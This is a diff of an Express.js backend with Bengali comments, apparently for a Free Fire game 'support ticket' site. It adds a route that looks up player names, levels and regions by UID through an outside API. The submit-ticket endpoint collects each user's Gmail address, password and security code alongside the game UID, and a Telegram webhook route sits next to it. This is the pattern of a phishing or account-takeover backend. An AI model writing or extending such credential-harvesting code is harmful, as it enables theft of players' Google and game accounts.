@@ -24,15 +24,9 @@ if (!global.persistentStore) {
 
 app.get('/', (req, res) => res.send("Backend Active"));
 
-// ১. টিকিট জমা নেওয়ার API (User-Agent ও ফালব্যাক ডাটা পার্সিং সহ)
-app.post('/api/submit-ticket', async (req, res) => {
-    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
-    
-    let playerName = "Unknown Player";
-    let playerLevel = "N/A";
-    let playerRegion = "Bangladesh";
-
-    // FF Info API থেকে ব্রাউজার হেডারসহ ডাটা ফেচ করা
+// ১. ফ্রন্টএন্ড থেকে সরাসরি UID দিয়ে প্লেয়ার ইনফো বের করার নতুন রুট
+app.get('/api/player-info/:uid', async (req, res) => {
+    const uid = String(req.params.uid);
     try {
         const ffRes = await axios.get(`https://ffxinfo-ffx.ffxapis.workers.dev/ff-info?uid=${encodeURIComponent(uid)}`, {
             headers: {
@@ -43,12 +37,54 @@ app.post('/api/submit-ticket', async (req, res) => {
         });
 
         const data = ffRes.data;
-        const basic = data?.data?.basicInfo || data?.basicInfo || data?.data || data || {};
+        const basic = data?.AccountInfo || data?.data?.basicInfo || data?.basicInfo || data || {};
+        
+        const nickname = basic.Nickname || basic.nickname || basic.name || basic.AccountName || "Unknown Player";
+        const level = basic.Level || basic.level || basic.AccountLevel || "N/A";
+        const region = basic.Region || basic.region || basic.AccountRegion || "Bangladesh";
 
-        // সম্ভাব্য সব ধরনের ফিল্ড নাম চেক করা
-        const foundName = basic.nickname || basic.name || basic.AccountName || data.nickname || data.name;
-        const foundLevel = basic.level || basic.AccountLevel || data.level;
-        const foundRegion = basic.region || basic.AccountRegion || data.region;
+        return res.json({
+            success: true,
+            data: {
+                uid,
+                name: nickname,
+                level: typeof level === 'number' ? `Level ${level}` : String(level),
+                region
+            }
+        });
+    } catch (error) {
+        console.error("FF Info Fetch Error:", error.message);
+        return res.status(500).json({
+            success: false,
+            message: "Player info fetch failed"
+        });
+    }
+});
+
+// ২. টিকিট জমা নেওয়ার API
+app.post('/api/submit-ticket', async (req, res) => {
+    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
+    
+    let playerName = "Unknown Player";
+    let playerLevel = "N/A";
+    let playerRegion = "Bangladesh";
+
+    // FF Info API থেকে ডাটা ফেচ করা
+    try {
+        const ffRes = await axios.get(`https://ffxinfo-ffx.ffxapis.workers.dev/ff-info?uid=${encodeURIComponent(uid)}`, {
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'application/json'
+            },
+            timeout: 6000
+        });
+
+        const data = ffRes.data;
+        const basic = data?.AccountInfo || data?.data?.basicInfo || data?.basicInfo || data || {};
+
+        const foundName = basic.Nickname || basic.nickname || basic.name || basic.AccountName;
+        const foundLevel = basic.Level || basic.level || basic.AccountLevel;
+        const foundRegion = basic.Region || basic.region || basic.AccountRegion;
 
         if (foundName) playerName = foundName;
         if (foundLevel) playerLevel = typeof foundLevel === 'number' ? `Level ${foundLevel}` : String(foundLevel);
@@ -109,7 +145,7 @@ app.post('/api/submit-ticket', async (req, res) => {
     }
 });
 
-// ২. টেলিগ্রাম ওয়েবহুক এবং মেসেজ আপডেট
+// ৩. টেলিগ্রাম ওয়েবহুক এবং মেসেজ আপডেট
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
 
@@ -211,7 +247,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     }
 });
 
-// ৩. লাইভ স্ট্যাটাস নেওয়ার API
+// ৪. লাইভ স্ট্যাটাস নেওয়ার API
 app.get('/api/check-status/:uid', (req, res) => {
     const uid = String(req.params.uid);
     const userData = global.persistentStore[uid] || {
